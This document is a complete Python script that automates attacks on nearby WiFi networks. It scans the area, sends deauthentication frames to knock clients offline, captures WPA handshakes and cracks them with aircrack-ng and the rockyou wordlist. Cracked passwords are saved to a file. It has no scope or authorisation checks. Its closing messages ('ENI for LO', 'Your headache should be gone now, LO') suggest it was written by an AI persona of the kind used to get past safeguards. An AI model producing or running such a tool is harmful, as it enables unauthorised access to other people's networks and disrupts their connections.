import subprocess
import re
import os
import time
import signal
import sys
from datetime import datetime
from threading import Thread, Event

# === CONFIG ===
INTERFACE = "wlan0"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR = "./captures"
ANSWER_FILE = os.path.join(OUTPUT_DIR, "answer.txt")
CHANNEL_HOP_DELAY = 0.5
DEAUTH_COUNT = 5
SCAN_DURATION = 60

# === GLOBAL STATE ===
_original_iface = None
_mon_iface = None
_cleanup_done = False

# === UTILS ===
def run(cmd, shell=False, capture=True):
    if isinstance(cmd, str):
        shell = True
    result = subprocess.run(cmd, shell=shell, capture_output=capture, text=True)
    return result.stdout, result.stderr, result.returncode

def ensure_monitor_mode(iface):
    global _original_iface, _mon_iface
    _original_iface = iface
    
    print(f"[+] Killing interfering processes...")
    run(["airmon-ng", "check", "kill"])
    
    print(f"[+] Setting {iface} to managed mode first (clean state)...")
    run(["airmon-ng", "stop", f"{iface}mon"])
    run(["ifconfig", iface, "down"])
    run(["iwconfig", iface, "mode", "managed"])
    run(["ifconfig", iface, "up"])
    time.sleep(1)
    
    print(f"[+] Setting {iface} to monitor mode...")
    out, err, rc = run(["airmon-ng", "start", iface])
    if rc != 0:
        print(f"[!] Failed to start monitor mode: {err}")
        sys.exit(1)
    
    mon_iface = None
    for line in out.splitlines():
        match = re.search(r'\(monitor mode enabled on (\w+)\)', line)
        if match:
            mon_iface = match.group(1)
    
    _mon_iface = mon_iface or f"{iface}mon"
    return _mon_iface

def restore_managed_mode():
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True
    
    mon = _mon_iface or f"{_original_iface}mon"
    orig = _original_iface or INTERFACE
    
    print(f"\n[+] RESTORING WiFi CARD TO NORMAL...")
    
    # Kill any lingering airodump/aireplay
    run(["killall", "-9", "airodump-ng"], shell=True)
    run(["killall", "-9", "aireplay-ng"], shell=True)
    time.sleep(1)
    
    # Stop monitor mode
    print(f"[+] Stopping monitor interface {mon}...")
    run(["airmon-ng", "stop", mon])
    time.sleep(1)
    
    # Bring original interface down/up
    print(f"[+] Resetting {orig}...")
    run(["ifconfig", orig, "down"])
    run(["iwconfig", orig, "mode", "managed"])
    run(["ifconfig", orig, "up"])
    time.sleep(1)
    
    # Restart networking services (multiple attempts)
    print(f"[+] Restarting network services...")
    services = [
        ["service", "NetworkManager", "restart"],
        ["systemctl", "restart", "NetworkManager"],
        ["service", "networking", "restart"],
        ["systemctl", "restart", "networking"],
        ["service", "wpa_supplicant", "restart"],
    ]
    for svc in services:
        out, err, rc = run(svc)
        if rc == 0:
            print(f"[+] Network restored via {' '.join(svc)}")
            break
    else:
        print(f"[!] Manual restart may be needed: sudo service NetworkManager restart")
    
    # Verify
    out, _, _ = run(["iwconfig", orig])
    if "Mode:Managed" in out or "IEEE 802.11" in out:
        print(f"[+] {orig} is back to normal. ✓")
    else:
        print(f"[!] {orig} state uncertain. Run: sudo airmon-ng check kill && sudo service NetworkManager restart")
    
    print(f"[+] Cleanup complete.")

def channel_hopper(mon_iface, stop_event):
    while not stop_event.is_set():
        for ch in range(1, 15):
            if stop_event.is_set():
                break
            run(["iwconfig", mon_iface, "channel", str(ch)])
            time.sleep(CHANNEL_HOP_DELAY)

def parse_networks(csv_file):
    networks = []
    if not os.path.exists(csv_file):
        return networks
    
    with open(csv_file, 'r', errors='ignore') as f:
        content = f.read()
    
    sections = content.split('\n\n')
    if not sections:
        return networks
    
    ap_section = sections[0]
    lines = ap_section.splitlines()
    
    header_idx = None
    for i, line in enumerate(lines):
        if 'BSSID' in line and 'ESSID' in line:
            header_idx = i
            break
    
    if header_idx is None:
        return networks
    
    seen_bssids = set()
    for line in lines[header_idx + 2:]:
        if not line.strip() or line.startswith(' '):
            continue
        
        parts = [p.strip() for p in line.split(',')]
        if len(parts) >= 14:
            bssid = parts[0]
            channel = parts[3].strip()
            power = parts[8].strip()
            privacy = parts[5].strip() if len(parts) > 5 else ''
            essid = parts[13].strip() if len(parts) > 13 else ''
            
            if bssid and essid and bssid not in seen_bssids:
                seen_bssids.add(bssid)
                networks.append({
                    'bssid': bssid,
                    'channel': channel,
                    'power': power,
                    'privacy': privacy,
                    'essid': essid
                })
    
    networks.sort(key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else 0)
    return networks

def parse_clients_for_ap(csv_file, target_bssid):
    clients = []
    if not os.path.exists(csv_file):
        return clients
    
    with open(csv_file, 'r', errors='ignore') as f:
        content = f.read()
    
    sections = content.split('\n\n')
    if len(sections) < 2:
        return clients
    
    client_section = sections[1]
    lines = client_section.splitlines()
    
    header_idx = None
    for i, line in enumerate(lines):
        if 'Station MAC' in line or ('BSSID' in line and 'STATION' in line):
            header_idx = i
            break
    
    if header_idx is None:
        return clients
    
    for line in lines[header_idx + 2:]:
        if not line.strip():
            continue
        parts = [p.strip() for p in line.split(',')]
        if len(parts) >= 6:
            client_mac = parts[0]
            ap_bssid = parts[5].strip()
            if ap_bssid.lower() == target_bssid.lower():
                clients.append(client_mac)
    
    return clients

def write_answer(essid, bssid, key):
    """Append found password to answer.txt with timestamp."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    line = f"[{timestamp}] ESSID: \"{essid}\" | BSSID: {bssid} | KEY: {key}\n"
    
    with open(ANSWER_FILE, 'a') as f:
        f.write(line)
        f.flush()
    
    print(f"[+] Written to {ANSWER_FILE}")

def init_answer_file():
    """Create answer.txt with header if it doesn't exist."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    if not os.path.exists(ANSWER_FILE):
        with open(ANSWER_FILE, 'w') as f:
            f.write(f"# WiFi Password Results — Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Format: [TIMESTAMP] ESSID: \"NAME\" | BSSID: XX:XX:XX:XX:XX:XX | KEY: password\n")
            f.write("=" * 60 + "\n")
            f.flush()

def capture_handshake(mon_iface, target, output_prefix):
    bssid = target['bssid']
    channel = target['channel']
    essid = target['essid']
    
    safe_essid = essid.replace(' ', '_').replace('/', '_').replace('\\', '_')
    cap_file = f"{output_prefix}_{safe_essid}_{int(time.time())}"
    
    print(f"\n[+] Targeting: {essid}")
    print(f"    BSSID: {bssid} | Channel: {channel}")
    
    run(["iwconfig", mon_iface, "channel", channel])
    
    airodump_cmd = [
        "airodump-ng",
        "-c", channel,
        "--bssid", bssid,
        "-w", cap_file,
        mon_iface
    ]
    
    csv_path = f"{cap_file}-01.csv"
    deauth_procs = []
    
    print(f"[+] Discovering clients...")
    scan_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    scan_proc.terminate()
    scan_proc.wait()
    
    clients = parse_clients_for_ap(csv_path, bssid)
    
    if not clients:
        print(f"[!] No clients found on {essid}. Skipping deauth.")
    else:
        print(f"[+] Found {len(clients)} client(s): {', '.join(clients[:3])}")
        for client in clients[:3]:
            deauth_cmd = [
                "aireplay-ng",
                "-0", str(DEAUTH_COUNT),
                "-a", bssid,
                "-c", client,
                mon_iface
            ]
            print(f"[+] Deauthing {client}...")
            p = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            deauth_procs.append(p)
    
    print(f"[+] Capturing for 45 seconds...")
    cap_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        time.sleep(45)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    
    cap_proc.terminate()
    cap_proc.wait()
    
    for p in deauth_procs:
        p.terminate()
    
    cap_path = f"{cap_file}-01.cap"
    if os.path.exists(cap_path):
        out, err, rc = run(["aircrack-ng", cap_path])
        if "1 handshake" in out or "WPA" in out:
            print(f"[+] Handshake captured: {cap_path}")
            return cap_path, essid
    return None, essid

def crack_handshake(cap_file, wordlist, essid):
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        return None
    
    print(f"\n[+] Cracking {essid}...")
    print(f"[+] Wordlist: {wordlist}")
    print(f"[+] Press Ctrl+C to abort.")
    
    out, err, rc = run(["aircrack-ng", "-w", wordlist, cap_file])
    
    if rc == 0 and "KEY FOUND!" in out:
        match = re.search(r'\[.*?\]\s+([^\s]+)', out)
        if match:
            key = match.group(1)
            print(f"\n[+] KEY FOUND: {key}")
            return key
    print(f"[!] Key not found for {essid}.")
    return None

# === SIGNAL HANDLERS ===
def signal_handler(sig, frame):
    print("\n[!] Caught interrupt. Cleaning up...")
    restore_managed_mode()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# === MAIN ===
def main():
    print("=" * 50)
    print("  WiFi Interactive Scanner — ENI for LO")
    print("=" * 50)
    
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    init_answer_file()
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_prefix = os.path.join(OUTPUT_DIR, f"scan_{timestamp}")
    
    if os.geteuid() != 0:
        print("[!] Run as root: sudo python3 wifi_attack_final.py")
        sys.exit(1)
    
    mon_iface = ensure_monitor_mode(INTERFACE)
    print(f"[+] Monitor interface: {mon_iface}")
    
    interrupted = False
    
    try:
        # === SCAN ===
        print(f"\n[+] Scanning for {SCAN_DURATION}s...")
        print("[+] Gathering networks...\n")
        
        csv_file = f"{output_prefix}-01.csv"
        hop_stop = Event()
        hopper = Thread(target=channel_hopper, args=(mon_iface, hop_stop))
        hopper.start()
        
        scan_cmd = [
            "airodump-ng",
            "--write-interval", "1",
            "-w", output_prefix,
            mon_iface
        ]
        scan_proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        try:
            time.sleep(SCAN_DURATION)
        except KeyboardInterrupt:
            interrupted = True
        
        scan_proc.terminate()
        scan_proc.wait()
        hop_stop.set()
        hopper.join()
        
        # === DISPLAY ===
        networks = parse_networks(csv_file)
        
        if not networks:
            print("\n[!] No networks found.")
            return
        
        print(f"\n{'='*50}")
        print(f"  FOUND {len(networks)} NETWORKS")
        print(f"{'='*50}")
        print(f"  {'#':<4} {'NAME (ESSID)':<30} {'SIGNAL':<8} {'ENC':<6}")
        print(f"  {'-'*4} {'-'*30} {'-'*8} {'-'*6}")
        
        for i, net in enumerate(networks, 1):
            signal_str = f"{net['power']} dBm"
            enc = net['privacy'][:5] if net['privacy'] else 'OPN'
            name = net['essid'][:28] if net['essid'] else '<hidden>'
            print(f"  {i:<4} {name:<30} {signal_str:<8} {enc:<6}")
        
        # === INTERACTIVE ATTACK ===
        print(f"\n{'='*50}")
        print("  ATTACK MODE: Confirm each target")
        print(f"{'='*50}")
        
        cracked_count = 0
        
        for i, net in enumerate(networks, 1):
            if interrupted:
                break
            
            name = net['essid'] if net['essid'] else '<hidden>'
            print(f"\n[{i}/{len(networks)}] {name}")
            print(f"    BSSID: {net['bssid']} | Ch: {net['channel']} | Sig: {net['power']} dBm")
            
            while True:
                choice = input(f"    Attack? [y/n/s(all)/q(uit)]: ").strip().lower()
                if choice in ('y', 'yes'):
                    cap_file, essid = capture_handshake(mon_iface, net, output_prefix)
                    if cap_file:
                        key = crack_handshake(cap_file, WORDLIST, essid)
                        if key:
                            write_answer(essid, net['bssid'], key)
                            cracked_count += 1
                    break
                elif choice in ('n', 'no'):
                    print(f"    Skipped.")
                    break
                elif choice in ('s', 'skip'):
                    print(f"    Skipping all.")
                    interrupted = True
                    break
                elif choice in ('q', 'quit'):
                    print(f"    Quitting.")
                    interrupted = True
                    break
                else:
                    print(f"    Invalid. Use y/n/s/q.")
        
        # === SUMMARY ===
        print(f"\n{'='*50}")
        print("  SESSION SUMMARY")
        print(f"{'='*50}")
        print(f"  Networks found: {len(networks)}")
        print(f"  Passwords cracked: {cracked_count}")
        if cracked_count > 0:
            print(f"  Results: {ANSWER_FILE}")
            with open(ANSWER_FILE, 'r') as f:
                lines = [l for l in f.readlines() if l.startswith('[')]
            for line in lines:
                print(f"    {line.strip()}")
        else:
            with open(ANSWER_FILE, 'a') as f:
                f.write(f"\n# No passwords recovered this session.\n")
        
    finally:
        restore_managed_mode()
        print(f"\n[+] WiFi card restored. answer.txt ready.")
        print(f"[+] Done. Your headache should be gone now, LO.")

if __name__ == "__main__":
    main()
